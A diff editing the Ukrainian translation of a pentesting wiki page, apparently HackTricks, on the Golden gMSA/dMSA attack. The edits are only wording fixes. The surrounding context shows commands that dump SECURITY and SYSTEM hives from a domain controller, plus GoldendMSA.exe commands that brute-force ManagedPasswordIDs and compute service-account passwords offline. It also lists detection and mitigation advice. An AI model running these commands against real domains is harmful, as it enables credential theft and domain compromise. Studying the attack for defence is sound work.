@@ -35,7 +35,7 @@
 ### Golden gMSA / dMSA
 ##### Фаза 1 – Витяг KDS Root Key
 
-Вивантаження з будь-якого DC (Копія тіньового тому / сирі хаби SAM+SECURITY або віддалені секрети):
+Витяг з будь-якого DC (Копія тіньового тому / сирі хаби SAM+SECURITY або віддалені секрети):
 ```cmd
 reg save HKLM\SECURITY security.hive
 reg save HKLM\SYSTEM  system.hive
@@ -73,10 +73,10 @@ GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
 ```
 ##### Фаза 3 – Вгадати / Виявити ManagedPasswordID (коли відсутній)
 
-Деякі розгортання *видаляють* `msDS-ManagedPasswordId` з ACL-захищених читань. 
+Деякі розгортання *видаляють* `msDS-ManagedPasswordId` з ACL-захищених читань.  
 Оскільки GUID є 128-бітним, наївний брутфорс є недоцільним, але:
 
-1. Перші **32 біти = Unix epoch time** створення облікового запису (з роздільною здатністю в хвилинах).
+1. Перші **32 біти = Unix epoch time** створення облікового запису (з роздільною здатністю в хвилинах).  
 2. За ними слідують 96 випадкових бітів.
 
 Отже, **вузький словник для кожного облікового запису** (± кілька годин) є реалістичним.
@@ -87,7 +87,7 @@ GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUI
 
 ##### Фаза 4 – Офлайн обчислення пароля та конвертація
 
-Якщо ManagedPasswordID відомий, дійсний пароль знаходиться в одному командному рядку:
+Як тільки ManagedPasswordID відомий, дійсний пароль знаходиться в одному командному рядку:
 ```powershell
 # derive base64 password
 GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
@@ -98,7 +98,7 @@ GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswor
 ## Виявлення та пом'якшення
 
 * Обмежте можливості **резервного копіювання DC та читання реєстру** для адміністраторів Tier-0.
-* Моніторте створення **Режиму відновлення служб каталогів (DSRM)** або **Копії тіньового тому** на DC.
+* Моніторте створення **Режиму відновлення служб каталогів (DSRM)** або **Копії тіней томів** на DC.
 * Аудитуйте читання / зміни до `CN=Master Root Keys,…` та прапорців `userAccountControl` облікових записів служб.
 * Виявляйте незвичайні **записи паролів base64** або раптове повторне використання паролів служб на різних хостах.
 * Розгляньте можливість перетворення облікових записів gMSA з високими привілеями на **класичні облікові записи служб** з регулярними випадковими ротаціями, де ізоляція Tier-0 неможлива.
@@ -113,7 +113,7 @@ GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswor
 ## Посилання
 
 - [Golden dMSA – обхід аутентифікації для делегованих облікових записів керованих служб](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
-- [gMSA Атаки Active Directory на облікові записи](https://www.semperis.com/blog/golden-gmsa-attack/)
+- [gMSA атаки облікових записів Active Directory](https://www.semperis.com/blog/golden-gmsa-attack/)
 - [Репозиторій Semperis/GoldenDMSA на GitHub](https://github.com/Semperis/GoldenDMSA)
 - [Improsec – атака довіри Golden gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)
 
